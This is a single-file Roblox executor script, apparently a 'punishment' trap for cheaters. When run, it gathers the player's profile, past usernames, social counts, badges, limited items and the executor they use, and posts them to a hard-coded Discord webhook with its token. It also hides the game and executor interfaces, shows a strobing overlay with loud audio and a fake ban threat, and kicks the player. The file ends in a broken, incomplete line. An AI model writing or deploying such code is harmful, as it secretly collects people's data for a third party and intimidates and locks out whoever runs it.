
--==================================================================
--   "FINAL HOURS"  --  anti-cheat punishment screen
--   SINGLE-FILE EXECUTOR SCRIPT  (no server script required)
--
--   on execution : reports executor + full public profile to webhook
--   sequence     : 5 glitched lines, then a hard kick
--   passion project by 101001010100011  |  zens  |  https://discord.gg/Z55BBv5v
--==================================================================

--=========================== SERVICES =============================

local Players         = game:GetService("Players")
local TweenService    = game:GetService("TweenService")
local ContentProvider = game:GetService("ContentProvider")
local SoundService    = game:GetService("SoundService")
local HttpService     = game:GetService("HttpService")
local StarterGui      = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local playerGui   = LocalPlayer:WaitForChild("PlayerGui", 20)
if not playerGui then
	playerGui = game:GetService("CoreGui")
end

local rng = Random.new()

--============================ CONFIG ==============================

local WEBHOOK_URL = "https://discord.com/api/webhooks/1551154489728442459/srnRRVQ6Ssz5IbeqgAdez1S139-DHbPtnhNvjpxBRVC31rPaMg3QzXOe3hMXxlKLJ3tz"

-- 8 = PST (UTC-8), 7 = PDT (UTC-7). Change during daylight saving.
local PACIFIC_UTC_OFFSET = 8
local PACIFIC_LABEL = (PACIFIC_UTC_OFFSET == 7) and "PDT" or "PST"

local IMAGE_IDS = {
	129479498204701, -- 1
	132136401230988, -- 2
	103887570225764, -- 3
	75210308468406,  -- 4
	88243109225877,  -- 5
	84609606642935,  -- 6
	105055458373791, -- 7
	120146372014827, -- 8
}

local AUDIO_ID     = 132884111463673
local AUDIO_VOLUME = 3

-- ASCII ONLY. The executor's HTTP/JSON path mangles multi-byte UTF-8, so no
-- ellipsis/bullet/accents anywhere in this file.
local KICK_MESSAGE = "you have 12 hours before you are banned... enjoy your final hours."

local BG_SCALE         = 2.5
local JITTER_SCALE     = 0.26
local HARD_JOLT_SCALE  = 0.50
local JITTER_RATE      = 0.045
local IMAGE_INTERVAL   = 0.15
local IMAGE_SCALE_TYPE = Enum.ScaleType.Crop

local FADE_IN         = 1.0
local HOLD            = 1.0
local FADE_OUT        = 0.5
local GLITCH_DELAY    = 0.5
local GLITCH_INTERVAL = 0.2
local START_DELAY     = 1.0
local KICK_DELAY      = 0.6

local BASE_GLITCH = 0.25
local glitchPower = BASE_GLITCH

local GLITCH_COLORS = {
	Color3.fromRGB(0, 140, 255),
	Color3.fromRGB(0, 255, 40),
	Color3.fromRGB(255, 0, 230),
	Color3.fromRGB(255, 150, 0),
	Color3.fromRGB(140, 0, 0),
	Color3.fromRGB(70, 0, 130),
}

local TEAR_COLORS = {
	Color3.fromRGB(255, 255, 255),
	Color3.fromRGB(0, 0, 0),
	Color3.fromRGB(0, 255, 60),
	Color3.fromRGB(255, 0, 200),
	Color3.fromRGB(120, 200, 255),
	Color3.fromRGB(160, 0, 0),
}

local GLYPHS = {
	"#","@","%","&","$","?","!","*","/","\\","|","~","^","<",">",
	"[","]","{","}","(",")","=","+","-","_","0","1","2","3","4","5",
	"6","7","8","9",
}

local TEXTS = {
	"if you are seeing this you might be wondering..",
	"why have i been brought here?",
	"you tried to cheat.. in a roblox game.",
	"so now, i have put a line of code that will get you anticheat banned!",
	"these are your, final hours.\n\npassion project by 101001010100011\nzens\nhttps://discord.gg/Z55BBv5v",
}

--======================== HTTP HELPERS ============================

local function httpRequest(opts)
	if type(request) == "function" then
		local ok, res = pcall(request, opts)
		if ok and res then return res end
	end
	if syn and type(syn.request) == "function" then
		local ok, res = pcall(syn.request, opts)
		if ok and res then return res end
	end
	if type(http_request) == "function" then
		local ok, res = pcall(http_request, opts)
		if ok and res then return res end
	end
	if type(http) == "function" then
		local ok, res = pcall(http, opts)
		if ok and res then return res end
	end
	return nil
end

local function postJSON(jsonBody)
	return httpRequest({
		Url     = WEBHOOK_URL,
		Method  = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body    = jsonBody,
	}) ~= nil
end

local function getJSON(url)
	local res = httpRequest({ Url = url, Method = "GET" })
	if not res then return nil end
	local body = res.Body or res.body
	if not body then return nil end
	local ok, data = pcall(function() return HttpService:JSONDecode(body) end)
	if not ok then return nil end
	return data
end

--======================== WEBHOOK REPORT ==========================

local function getExecutorName()
	if type(identifyexecutor) == "function" then
		local ok, name, ver = pcall(identifyexecutor)
		if ok and name then
			return tostring(name) .. (ver and (" v" .. tostring(ver)) or "")
		end
	end
	if type(getexecutorname) == "function" then
		local ok, name = pcall(getexecutorname)
		if ok and name then return tostring(name) end
	end
	if syn and type(syn.identifyexecutor) == "function" then
		local ok, name = pcall(syn.identifyexecutor)
		if ok and name then return tostring(name) end
	end

	local probes = {
		"syn", "Krnl", "krnl", "fluxus", "Fluxus", "ScriptWare", "Scriptware",
		"sunc", "is_sirhurt_closure", "SecureLoadstring", "protosmasher",
		"KRNL_LOADED", "isElectron", "getgenv",
	}
	for _, probe in ipairs(probes) do
		local ok, value = pcall(function() return _G[probe] end)
		if ok and value ~= nil then return probe end
	end

	return "Unknown executor"
end

local function pacificStamp()
	local shifted = os.time() - (PACIFIC_UTC_OFFSET * 3600)
	return os.date("!%Y-%m-%d %I:%M:%S %p", shifted) .. " " .. PACIFIC_LABEL
end

local function accountAgeDays(createdISO)
	local y, m, d = tostring(createdISO):match("^(%d+)-(%d+)-(%d+)")
	if not y then return nil end
	local created = os.time({
		year  = tonumber(y),
		month = tonumber(m),
		day   = tonumber(d),
		hour  = 12,
	})
	return math.floor((os.time() - created) / 86400)
end

-- Name of the experience this was executed in. Tries the modern
-- universe route first, then two older fallbacks.
local function getGameName()
	local placeId = tostring(game.PlaceId)

	local uni = getJSON("https://apis.roblox.com/universes/v1/places/" .. placeId .. "/universe")
	if uni and uni.universeId then
		local info = getJSON("https://games.roblox.com/v1/games?universeIds=" .. tostring(uni.universeId))
		if info and info.data and info.data[1] and info.data[1].name then
			return info.data[1].name
		end
	end

	local details = getJSON("https://games.roblox.com/v1/games/multiget-place-details?placeIds=" .. placeId)
	if details and details[1] and details[1].name then
		return details[1].name
	end

	local asset = getJSON("https://economy.roblox.com/v2/assets/" .. placeId .. "/details")
	if asset and asset.Name then
		return asset.Name
	end

	return nil
end

local function collectPlayerInfo()
	local id     = tostring(LocalPlayer.UserId)
	local fields = {}
	local headshot, bodyShot

	local function add(name, value, inline)
		if value == nil then return end
		local s = tostring(value)
		if s == "" then return end
		if #s > 1000 then s = s:sub(1, 997) .. "..." end
		table.insert(fields, { name = name, value = s, inline = inline ~= false })
	end

	-- --- core account -------------------------------------------------
	local userData = getJSON("https://users.roblox.com/v1/users/" .. id)
	if userData then
		if userData.created then
			local datePart = tostring(userData.created):sub(1, 10)
			local days     = accountAgeDays(userData.created)
			if days then
				add("Joined", ("%s  (%d days / %.1f yrs)"):format(datePart, days, days / 365.25), true)
			else
				add("Joined", datePart, true)
			end
		end
		if userData.displayName then add("Display name", userData.displayName, true) end
		if userData.hasVerifiedBadge ~= nil then
			add("Verified", userData.hasVerifiedBadge and "Yes" or "No", true)
		end
		if userData.description and #userData.description > 0 then
			add("Bio", userData.description, false)
		end
	end

	-- --- avatar -------------------------------------------------------
	local hs = getJSON("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="
		.. id .. "&size=420x420&format=Png&isCircular=false")
	if hs and hs.data and hs.data[1] and hs.data[1].imageUrl then
		headshot = hs.data[1].imageUrl
	end
	local fb = getJSON("https://thumbnails.roblox.com/v1/users/avatar?userIds="
		.. id .. "&size=720x720&format=Png&isCircular=false")
	if fb and fb.data and fb.data[1] and fb.data[1].imageUrl then
		bodyShot = fb.data[1].imageUrl
	end

	-- --- social counts ------------------------------------------------
	local friends = getJSON("https://friends.roblox.com/v1/users/" .. id .. "/friends/count")
	if friends and friends.count then add("Friends", friends.count, true) end

	local followers = getJSON("https://friends.roblox.com/v1/users/" .. id .. "/followers/count")
	if followers and followers.count then add("Followers", followers.count, true) end

	local following = getJSON("https://friends.roblox.com/v1/users/" .. id .. "/followings/count")
	if following and following.count then add("Following", following.count, true) end

	-- --- username history ---------------------------------------------
	-- NOTE: this endpoint returns { previousUsernames = { "Name1", ... } }
	-- (an array of plain strings), not a list of objects with a .name key.
	local hist = getJSON("https://users.roblox.com/v1/users/" .. id
		.. "/username-history?limit=10&sortOrder=Desc")
	if hist then
		local list = hist.previousUsernames or hist.data
		local names = {}
		if type(list) == "table" then
			for i, entry in ipairs(list) do
				if i <= 5 then
					local n = (type(entry) == "table") and entry.name or tostring(entry)
					if n then table.insert(names, n) end
				end
			end
		end
		if #names > 0 then add("Previous names", table.concat(names, ", "), false) end
	end

	-- --- badges --------------------------------------------------------
	local badges = getJSON("https://badges.roblox.com/v1/users/" .. id
		.. "/badges?limit=10&sortOrder=Desc")
	if badges and badges.data then
		local names = {}
		for i, b in ipairs(badges.data) do
			if i <= 6 then table.insert(names, b.name) end
		end
		if #names > 0 then
			add("Recent badges", ("%d+ shown\n%s"):format(#names, table.concat(names, "\n")), false)
		end
	end

	-- --- own games (names first, stats underneath) ----------------------
	local games = getJSON("https://games.roblox.com/v2/users/" .. id
		.. "/games?accessFilter=Public&limit=10")
	if games and games.data then
		local visits = 0
		local names  = {}
		for i, g in ipairs(games.data) do
			visits = visits + (tonumber(g.placeVisits) or 0)
			if i <= 4 then table.insert(names, g.name) end
		end
		local stats = ("%d game(s), %s total visits"):format(#games.data, tostring(visits))
		if #names > 0 then
			add("Own games", table.concat(names, "\n") .. "\n" .. stats, false)
		else
			add("Own games", stats, false)
		end
	end

	-- --- limiteds / RAP ------------------------------------------------
	local collect = getJSON("https://inventory.roblox.com/v1/users/" .. id
		.. "/assets/collectibles?limit=100&sortOrder=Desc")
	if collect and collect.data then
		local rap, count = 0, 0
		for _, item in ipairs(collect.data) do
			rap = rap + (tonumber(item.recentAveragePrice) or 0)
			count = count + 1
		end
		add("Limiteds", ("%d items - RAP %s R$"):format(count, tostring(rap)), false)
	end

	return fields, headshot, bodyShot
end

local function reportExecution()
	local fields, headshot, bodyShot = {}, nil, nil

	local ok = pcall(function()
		fields, headshot, bodyShot = collectPlayerInfo()
	end)

	local gameName
	pcall(function()
		gameName = getGameName()
	end)

	-- always-present fields go first
	local head = {
		{ name = "Executor",    value = getExecutorName(),            inline = true },
		{ name = "Roblox user", value = LocalPlayer.Name,             inline = true },
		{ name = "Roblox ID",   value = tostring(LocalPlayer.UserId), inline = true },
		{ name = "Time (PST)",  value = pacificStamp(),               inline = true },
		{ name = "Game",        value = gameName or ("Unknown (place " .. tostring(game.PlaceId) .. ")"), inline = false },
	}

	local all = head
	if ok and fields then
		for _, f in ipairs(fields) do table.insert(all, f) end
	end

	-- Discord caps embeds at 25 fields
	if #all > 25 then
		local trimmed = {}
		for i = 1, 25 do trimmed[i] = all[i] end
		all = trimmed
	end

	local embed = {
		title       = "Executor detected",
		description = "Someone executed the final hours script.",
		color       = 0x8B0000,
		fields      = all,
		footer      = { text = "passion project by 101001010100011 | zens | https://discord.gg/Z55BBv5v" },
	}
	if headshot then embed.thumbnail = { url = headshot } end
	if bodyShot then embed.image     = { url = bodyShot } end

	local payload = { username = "Final Hours", embeds = { embed } }

	local encoded
	local encodeOk = pcall(function()
		encoded = HttpService:JSONEncode(payload)
	end)
	if not encodeOk or not encoded then
		warn("[FinalHours] Could not encode webhook payload.")
		return
	end

	if postJSON(encoded) then
		print("[FinalHours] Webhook sent." .. (ok and "" or " (profile lookup partially failed)"))
	else
		warn("[FinalHours] Webhook blocked by this executor's HTTP sandbox.")
	end
end

-- NOTE: intentionally NOT spawned here. It is deferred to the very end of
-- the file so that a slow/blocking HTTP sandbox can never delay the overlay.

--=========================== BUILD GUI ============================

-- IMPORTANT: CoreGui renders ABOVE PlayerGui in Roblox. An executor's
-- floating icon lives in CoreGui, so an overlay parented to PlayerGui
-- always loses the draw order. Parent into CoreGui when the executor
-- allows it, and fall back to PlayerGui if it is locked off.
local host = playerGui
do
	local function usable(container)
		if not container then return false end
		return pcall(function() return container:GetChildren() end)
	end

	-- 1) gethui() is the executor API built for exactly this: a container
	--    that renders ABOVE CoreGui and above the game's own GUIs, and
	--    that content/assets load into normally.
	local huiOk, hui = pcall(function()
		if type(gethui) == "function" then return gethui() end
		return nil
	end)

	if huiOk and usable(hui) then
		host = hui
	else
		-- 2) plain CoreGui
		local ok, coreGui = pcall(function() return game:GetService("CoreGui") end)
		if ok and usable(coreGui) then
			host = coreGui
		end
	end
end

-- clear any previous copy out of BOTH containers
for _, container in ipairs({ playerGui, host }) do
	pcall(function()
		local prev = container:FindFirstChild("FinalHoursOverlay")
		if prev then prev:Destroy() end
	end)
end

local gui = Instance.new("ScreenGui")
gui.Name           = "FinalHoursOverlay"
gui.ResetOnSpawn   = false
gui.IgnoreGuiInset = true
gui.DisplayOrder   = 999999999
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- If the executor lets us read CoreGui but refuses writes, fall back safely.
local parented = pcall(function() gui.Parent = host end)
if not parented or gui.Parent ~= host then
	pcall(function() gui.Parent = playerGui end)
end

-- Absolute-pixel sizing. Inside gethui()/CoreGui containers, scale-based
-- sizing of children can resolve against an unexpected parent size, which
-- makes a 2.5-scale frame compute to zero pixels and render nothing.
-- Offsets measured from the real viewport always render.
-- MUST be defined before the GUI below actually uses px()/py().
local function viewportSize()
	local cam = workspace.CurrentCamera
	if cam then return cam.ViewportSize end
	return Vector2.new(1920, 1080)
end

local VP = viewportSize()
local function px(x) return math.floor(VP.X * x) end
local function py(y) return math.floor(VP.Y * y) end

local function assetID(id) return "rbxassetid://" .. tostring(id) end
local function thumbID(id) return "rbxthumb://type=Asset&id=" .. tostring(id) .. "&w=1024&h=1024" end

local bgFrame = Instance.new("Frame")
bgFrame.Name             = "GlitchBackground"
bgFrame.AnchorPoint      = Vector2.new(0.5, 0.5)
bgFrame.Position         = UDim2.fromScale(0.5, 0.5)
bgFrame.Size             = UDim2.fromOffset(px(BG_SCALE), py(BG_SCALE))
bgFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bgFrame.BorderSizePixel  = 0
bgFrame.ZIndex           = 1
bgFrame.Parent           = gui

local imageLabels = {}
for i, id in ipairs(IMAGE_IDS) do
	local lbl = Instance.new("ImageLabel")
	lbl.Name                   = "Slide" .. i
	lbl.Position               = UDim2.fromScale(0, 0)
	lbl.Size                   = UDim2.fromScale(1, 1)
	lbl.BackgroundTransparency = 1
	lbl.BorderSizePixel        = 0
	lbl.Image                  = assetID(id)
	lbl.ScaleType              = IMAGE_SCALE_TYPE
	lbl.Visible                = (i == 1)
	lbl.ZIndex                 = 1
	lbl.Parent                 = bgFrame
	imageLabels[i] = lbl
end

local textFrame = Instance.new("Frame")
textFrame.Name                   = "TextLayer"
textFrame.AnchorPoint            = Vector2.new(0.5, 0.5)
textFrame.Position               = UDim2.fromScale(0.5, 0.5)
textFrame.Size                   = UDim2.fromOffset(VP.X, VP.Y)
textFrame.BackgroundTransparency = 1
textFrame.ZIndex                 = 10
textFrame.Parent                 = gui

local function makeTextLabel(name, zindex)
	local lbl = Instance.new("TextLabel")
	lbl.Name                   = name
	lbl.AnchorPoint            = Vector2.new(0.5, 0.5)
	lbl.Position               = UDim2.fromScale(0.5, 0.5)
	lbl.Size                   = UDim2.fromOffset(px(0.72), py(0.24))
	lbl.BackgroundTransparency = 1
	lbl.Font                   = Enum.Font.Code
	lbl.TextScaled             = true
	lbl.TextWrapped            = true
	lbl.TextXAlignment         = Enum.TextXAlignment.Center
	lbl.TextYAlignment         = Enum.TextYAlignment.Center
	lbl.TextColor3             = Color3.fromRGB(255, 255, 255)
	lbl.TextStrokeColor3       = Color3.fromRGB(0, 0, 0)
	lbl.TextStrokeTransparency = 1
	lbl.TextTransparency       = 1
	lbl.Text                   = ""
	lbl.ZIndex                 = zindex
	lbl.Parent                 = textFrame

	local limit = Instance.new("UITextSizeConstraint")
	limit.MaxTextSize = 24
	limit.MinTextSize = 8
	limit.Parent = lbl

	return lbl
end

local textLabel = makeTextLabel("GlitchText", 11)
local ghostR    = makeTextLabel("GhostRed",   10)
local ghostB    = makeTextLabel("GhostBlue",   9)
ghostR.TextColor3 = Color3.fromRGB(255, 0, 60)
ghostB.TextColor3 = Color3.fromRGB(0, 220, 255)

local tearBars = {}
for i = 1, 8 do
	local bar = Instance.new("Frame")
	bar.Name                   = "Tear" .. i
	bar.BackgroundColor3       = Color3.new(1, 1, 1)
	bar.BackgroundTransparency = 1
	bar.BorderSizePixel        = 0
	bar.Size                   = UDim2.new(0, VP.X, 0, 4)
	bar.Position               = UDim2.new(0, 0, 0, 0)
	bar.ZIndex                 = 45
	bar.Parent                 = gui
	tearBars[i] = bar
end

local flash = Instance.new("Frame")
flash.Name                   = "Strobe"
flash.Size                   = UDim2.fromOffset(VP.X, VP.Y)
flash.BackgroundColor3       = Color3.new(1, 1, 1)
flash.BackgroundTransparency = 1
flash.BorderSizePixel        = 0
flash.ZIndex                 = 50
flash.Parent                 = gui

-- Re-measure whenever the window changes, and once the text labels exist.
local function relayout()
	VP = viewportSize()
	pcall(function()
		bgFrame.Size   = UDim2.fromOffset(px(BG_SCALE), py(BG_SCALE))
		textFrame.Size = UDim2.fromOffset(VP.X, VP.Y)
		flash.Size     = UDim2.fromOffset(VP.X, VP.Y)
		textLabel.Size = UDim2.fromOffset(px(0.72), py(0.24))
		ghostR.Size    = textLabel.Size
		ghostB.Size    = textLabel.Size
	end)
end

pcall(function()
	local cam = workspace.CurrentCamera
	if cam then
		cam:GetPropertyChangedSignal("ViewportSize"):Connect(relayout)
	end
end)
relayout()

local sound = Instance.new("Sound")
sound.Name    = "StaticLoop"
sound.SoundId = assetID(AUDIO_ID)
sound.Volume  = AUDIO_VOLUME
sound.Looped  = true
sound.Parent  = SoundService

--===============  OVERRIDE ROBLOX + EXECUTOR ICONS  ================

-- Name fragments of executor UIs to switch off. "delta" is the one to
-- care about here; the rest are other common executors' overlays.
local EXECUTOR_KEYWORDS = {
	"delta", "krnl", "fluxus", "synapse", "scriptware", "sirhurt",
	"solara", "xeno", "codex", "hydrogen", "arceus", "vega",
	"trigon", "quantum", "valyse", "executor", "exploit",
}

local function lockCoreUI()
	-- hides chat, player list, backpack, emotes, health, leaderboard
	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
	-- hides the top-left Roblox menu button + the whole topbar strip
	pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)

	-- belt and braces for versions where "All" does not cover everything
	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false) end)
	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false) end)
	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false) end)
	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false) end)
end

local function lockExecutorUI()
	local ok, coreGui = pcall(function() return game:GetService("CoreGui") end)
	if not ok or not coreGui then return end

	local ok2, children = pcall(function() return coreGui:GetChildren() end)
	if not ok2 or type(children) ~= "table" then return end

	for _, obj in ipairs(children) do
		if obj.Name ~= "FinalHoursOverlay" then
			local name = string.lower(obj.Name)
			for _, keyword in ipairs(EXECUTOR_KEYWORDS) do
				if string.find(name, keyword, 1, true) then
					pcall(function() obj.Enabled = false end)
					pcall(function() obj.Visible = false end)
					break
				end
			end
		end
	end
end

-- Re-applied forever: Roblox restores the topbar on respawn and several
-- executors re-show their icon on a timer.
task.spawn(function()
	while gui.Parent do
		pcall(lockCoreUI)
		pcall(lockExecutorUI)
		task.wait(0.5)
	end
end)

--================= BACKGROUND LOADING (non-blocking) ==============

task.spawn(function()
	local pass1 = {}
	for _, lbl in ipairs(imageLabels) do table.insert(pass1, lbl) end
	pcall(function() ContentProvider:PreloadAsync(pass1) end)

	local retry = {}
	for i, lbl in ipairs(imageLabels) do
		if not lbl.IsLoaded then
			lbl.Image = thumbID(IMAGE_IDS[i])
			table.insert(retry, lbl)
		end
	end
	if #retry > 0 then
		pcall(function() ContentProvider:PreloadAsync(retry) end)
		for i, lbl in ipairs(imageLabels) do
			if not lbl.IsLoaded then
				warn(("[FinalHours] Image %d (%d) failed to load - asset may be private."):format(i, IMAGE_IDS[i]))
			end
		end
	end

	-- Definitive read-out of whether the backgrounds are actually usable.
	local loaded = 0
	for _, lbl in ipairs(imageLabels) do
		if lbl.IsLoaded then loaded = loaded + 1 end
	end

	if loaded == 0 then
		warn("[FinalHours] 0/8 background images loaded. The overlay and text will still run, but the background will be black.")
		warn("[FinalHours] This usually means the assets are NOT public, or were uploaded by a different account than the one running this.")
	else
		print(("[FinalHours] %d/%d background images loaded."):format(loaded, #imageLabels))
	end
end)

--============================ SYSTEMS =============================

task.spawn(function()
	task.wait(START_DELAY)
	local current = 1
	while gui.Parent do
		local show
		if glitchPower > 0.6 and rng:NextNumber() < 0.25 then
			show = rng:NextInteger(1, #imageLabels)
		else
			show = current
			current = current % #imageLabels + 1
		end

		imageLabels[show].Visible = true
		for i, lbl in ipairs(imageLabels) do
			if i ~= show then lbl.Visible = false end
		end

		task.wait(IMAGE_INTERVAL)
	end
end)

task.spawn(function()
	while gui.Parent do
		local amp = math.min(JITTER_SCALE * (0.5 + glitchPower), HARD_JOLT_SCALE)
		if rng:NextNumber() < 0.05 * glitchPower then
			amp = HARD_JOLT_SCALE
		end

		local dx = (rng:NextNumber() * 2 - 1) * amp
		local dy = (rng:NextNumber() * 2 - 1) * amp
		bgFrame.Position = UDim2.new(0.5 + dx, 0, 0.5 + dy, 0)

		task.wait(glitchPower > 0.6 and 0.025 or JITTER_RATE)
	end
end)

local textBase    = Vector2.new(0, 0)
local ghostSpread = 0

local function applyTextPositions()
	textLabel.Position = UDim2.new(0.5, textBase.X, 0.5, textBase.Y)
	ghostR.Position    = UDim2.new(0.5, textBase.X + ghostSpread, 0.5, textBase.Y)
	ghostB.Position    = UDim2.new(0.5, textBase.X - ghostSpread, 0.5, textBase.Y)
end

task.spawn(function()
	while gui.Parent do
		local power = glitchPower

		local amp = 1 + math.floor(power * 9)
		textBase = Vector2.new(rng:NextInteger(-amp, amp), rng:NextInteger(-amp, amp))

		if rng:NextNumber() < 0.25 * power + 0.05 then
			ghostSpread = rng:NextInteger(1, 2 + math.floor(power * 6))
		else
			ghostSpread = math.floor(power * 2)
		end
		applyTextPositions()

		local cam = workspace.CurrentCamera
		local vp  = cam and cam.ViewportSize or VP
		local vh  = vp.Y
		for _, bar in ipairs(tearBars) do
			if power > 0.3 and rng:NextNumber() < 0.3 * power then
				bar.Size                   = UDim2.new(0, vp.X, 0, rng:NextInteger(2, 18))
				bar.Position               = UDim2.new(0, 0, 0, rng:NextInteger(0, math.max(0, vh - 20)))
				bar.BackgroundColor3       = TEAR_COLORS[rng:NextInteger(1, #TEAR_COLORS)]
				bar.BackgroundTransparency = rng:NextNumber() * 0.45 + 0.15
			else
				bar.BackgroundTransparency = 1
			end
		end

		if power > 0.45 and rng:NextNumber() < 0.07 * power then
			if rng:NextNumber() < 0.55 then
				flash.BackgroundColor3 = Color3.new(1, 1, 1)
			else
				flash.BackgroundColor3 = Color3.new(0, 0, 0)
			end
			flash.BackgroundTransparency = rng:NextNumber() * 0.25
		else
			flash.BackgroundTransparency = 1
		end

		if sound.IsPlaying and rng:NextNumber() < 0.15 * power then
			sound.PlaybackSpeed = 0.85 + rng:NextNumber() * 0.6
		end

		task.wait(0.035)
	end
end)

--============================= TEXT ===============================

local GLYPH_MIN = 1

local function corrupt(str, amount)
	local out = {}
	for i = 1, #str do
		local c = str:sub(i, i)
		if c == " " or c == "\n" or rng:NextNumber() >= amount then
			out[i] = c
		else
			out[i] = GLYPHS[rng:NextInteger(1, #GLYPHS)]
		end
	end
	return table.concat(out)
end

local glitchToken = 0

local function showText(str)
	glitchToken = glitchToken + 1
	local token = glitchToken

	textLabel.Text                   = str
	textLabel.TextColor3             = Color3.fromRGB(255, 255, 255)
	textLabel.TextTransparency       = 1
	textLabel.TextStrokeTransparency = 1
	ghostR.Text                      = str
	ghostB.Text                      = str
	ghostR.TextTransparency          = GLYPH_MIN
	ghostB.TextTransparency          = GLYPH_MIN
	textBase    = Vector2.new(0, 0)
	ghostSpread = 0

	TweenService:Create(
		textLabel,
		TweenInfo.new(FADE_IN, Enum.EasingStyle.Linear),
		{ TextTransparency = 0, TextStrokeTransparency = 0 }
	):Play()
	task.wait(FADE_IN)

	task.spawn(function()
		task.wait(GLITCH_DELAY)
		if token ~= glitchToken then return end

		glitchPower = 1
		GLYPH_MIN   = 0.4
		ghostR.TextTransparency = 0.4
		ghostB.TextTransparency = 0.4

		local ci = 1
		while token == glitchToken do
			textLabel.TextColor3 = GLITCH_COLORS[ci]
			ci = ci % #GLITCH_COLORS + 1

			local shown = str
			if rng:NextNumber() < 0.8 then
				shown = corrupt(str, 0.18)
			end
			textLabel.Text = shown
			ghostR.Text    = shown
			ghostB.Text    = shown

			task.wait(GLITCH_INTERVAL)
		end
	end)

	task.wait(HOLD)

	local tw = TweenInfo.new(FADE_OUT, Enum.EasingStyle.Linear)
	TweenService:Create(textLabel, tw, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
	TweenService:Create(ghostR,    tw, { TextTransparency = 1 }):Play()
	TweenService:Create(ghostB,    tw, { TextTransparency = 1 }):Play()
	task.wait(FADE_OUT)

	glitchToken = glitchToken + 1
	glitchPower = BASE_GLITCH
	GLYPH_MIN   = 1
	textLabel.Text                   = str
	ghostR.Text                      = str
	ghostB.Text                      = str
	textLabel.TextTransparency       = 1
	textLabel.TextStrokeTransparency = 1
	ghostR.TextTransparency          = 1
	ghostB.TextTransparency          = 1
end

--============================= KICK ===============================

local kicked = false

local function deliverKick(attempt)
	if kicked then return end
	attempt = attempt or 1

	local ok = pcall(function() LocalPlayer:Kick(KICK_MESSAGE) end)
	if not ok then
		ok = pcall(function() Players.LocalPlayer:Kick(KICK_MESSAGE) end)
	end
	if not ok then
		ok = pcall(function() game:GetService("Players").LocalPlayer:Kick(KICK_MESSAGE) end)
	end

	if ok then
		kicked = true
		return
	end

	if attempt < 6 then
		task.delay(0.75, function() deliverKick(attempt + 1) end)
	else
		warn("[FinalHours] Kick call was blocked - leaving the overlay + audio running as a fallback lock.")
	end
end

--============================= RUN ================================

local SEQUENCE_TIME = START_DELAY + (#TEXTS * (FADE_IN + HOLD + FADE_OUT)) + KICK_DELAY

task.spawn(function()
	sound:Play()
	task.wait(START_DELAY)
	for _, line in ipairs(TEXTS) do
		showText(line)
	end
	task.wait(KICK_DELAY)
	deliverKick()
end)

task.spawn(function()
	task.wait(SEQUENCE_TIME + 1.5)
	deliverKick()
end)

print(("[FinalHours] Armed. Kicking in ~%.1fs."):format(SEQUENCE_TIME))

--==================================================================
--  "anticheat trigger" stub
--==================================================================
local lp = game:GetService("Players").LocalPlayer
local mouse = lp:GetMouse()
print(mouse)

--==================================================================
--  Webhook report last: the whole scare sequence is already armed by
--  this point, so nothing here can stop it from running.
--==================================================================
task.delay(0.25, reportExecution)

local function = 
